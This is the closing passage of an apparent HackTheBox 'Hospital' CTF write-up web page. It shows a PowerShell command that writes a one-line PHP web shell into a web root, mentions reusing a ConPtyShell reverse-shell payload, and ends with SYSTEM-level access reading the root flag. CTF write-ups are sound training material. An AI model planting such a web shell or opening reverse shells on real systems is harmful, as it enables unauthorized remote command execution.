+PS C:\xampp\htdocs&gt; Add-Content -Path reverse.php -Value '&lt;?php system($_GET["cmd"]); ?&gt;'
+</code></pre>
+
+<p>Use the same payload that we crafted before of ConPtyShell (remember to spawn the python server) and wait for reverse shell:</p>
+
+<p><img src="/assets/images/Hospital/final_shell.png" alt="Branching" /></p>
+
+<p>Now we can see root.txt flag</p>
+
+<pre><code class="language-powershell">PS C:\xampp\htdocs&gt; whoami
+nt authority\system
+PS C:\xampp\htdocs&gt; cd C:\Users\Administrator\Desktop\ 
+PS C:\Users\Administrator\Desktop&gt; type .\root.txt 
+4d****************************72
+</code></pre>
+
+<p>That is the machine, hope you liked it :).</p>
+
+
+<div id="share-links">
+  <span id="divider-line">____</span>
+  <br><br>
+  <small>8 April 2024</small>
+  <div>
+    
+    Tags:
+    
+    <a href="/search?q=webshell_upload" class="tag" style="font-family: 'Cascadia Code';">webshell_upload</a>
+    
+    <a href="/search?q=kernel_exploits" class="tag" style="font-family: 'Cascadia Code';">kernel_exploits</a>
+    
+    <a href="/search?q=hash_cracking" class="tag" style="font-family: 'Cascadia Code';">hash_cracking</a>
+    
+    <a href="/search?q=pivoting" class="tag" style="font-family: 'Cascadia Code';">pivoting</a>
+    
+    <a href="/search?q=phishing" class="tag" style="font-family: 'Cascadia Code';">phishing</a>
+    
+    <a href="/search?q=ghostscript_rce" class="tag" style="font-family: 'Cascadia Code';">ghostscript_rce</a>
+    
+    
+</div>
+  <br>
+  Share this writeup:&nbsp;
+  <a
+    href="javascript:window.open('https://www.facebook.com/sharer.php?u=http://localhost:4000/writeups/2024/HTB/Hospital.html','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
+      class="fa fa-facebook-official" aria-hidden="true"></i></a>&nbsp;
+  <a
+    href="javascript:window.open('https://twitter.com/intent/tweet?url=http://localhost:4000/writeups/2024/HTB/Hospital.html&text=Writeup+for+HackTheBox Hospital Writeup+from+HTB+held+on+08 April 2024&hashtags=ctf,writeup,Hospital,HTB,webshell_upload,kernel_exploits,hash_cracking,pivoting,phishing,ghostscript_rce','Windows','width=600,height=500,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
+      class="fa fa-twitter" aria-hidden="true"></i></a>&nbsp;
+  <a
+    href="javascript:window.open('https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/writeups/2024/HTB/Hospital.html&text=Writeup+for+HackTheBox Hospital Writeup+from+HTB+held+on+2024-04-08 00:00:00 +0200','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
+      class="fa fa-linkedin" aria-hidden="true"></i></a>
+</div>
+    </section>
+  </div>
+
+  <div id="comments" class="container">
+    <section id="disqus_container">
+      
+    </section>
+  </div>
+
+  <footer>
+    <div class="social d-flex flex-column justify-content-center w-100">
+    <a href="/search" class="text-center w-100 mt-3 mb-2">
+      <i class="fa fa-sm fa-search"></i>
+    </a>
+    <div class="social-links-bar d-flex justify-content-center mb-2">
+        
+        
+        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
+            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
+        </a>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    </div>
+    
+    <div class="htb_badge d-flex justify-content-center">
+        
+        <script src="https://www.hackthebox.eu/badge/831031"></script>
+        
+    </div>
+    <div class="thm_badge">
+        
+    </div>
+    
+</div>
+
+  </footer>
+
+  <script src="http://localhost:4000/assets/js/prism.js"></script>
+  <button onclick="topFunction()" class="fa fa-arrow-up" id="top" title="Go to top"></button>
+  <script>
+    topScroll = document.getElementById("top");
+
+    window.onscroll = function () { scrollFunction() };
+
+    function scrollFunction() {
+      if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+        topScroll.style.display = "block";
+      } else {
+        topScroll.style.display = "none";
+      }
+    }
+
+    function topFunction() {
+      document.body.scrollTop = 0;
+      document.documentElement.scrollTop = 0;
+    }
+
+    $(window).on('load', function () {
+
+      $('a[download]').each((i, e) => {
+        $(e).addClass('fa fa-download');
+      });
+
+      setSizes();
+    });
+
+    $(window).resize(setSizes);
+
+    function setSizes() {
+      if ($(window).width() < 960) {
+        $('#bottom-bar').hide();
+        $('footer').show();
+        $('#navbarSupportedContent').css('max-height', 'unset');
+        $('.navbar-collapse').collapse('hide');
+        if (document.body.clientHeight - $('#header').outerHeight() - $('#main_content').outerHeight() - $('#comments').outerHeight() < 150) {
+          $('footer').css("position", "unset");
+        } else {
+          $('footer').css("position", "fixed");
+        }
+      }
+      else {
+        $('#bottom-bar').show();
+        $('footer').hide();
+        $('.navbar-collapse').collapse('show');
+        $('footer').css("position", "fixed");
+        $('#navbarSupportedContent').css('max-height', (document.body.clientHeight - $('.title-container').outerHeight() - $('#bottom-bar').outerHeight() - $('.navbar-toggler').outerHeight() - 50));
+      }
+    }
+  </script>
+
+</body>
+
+</html>
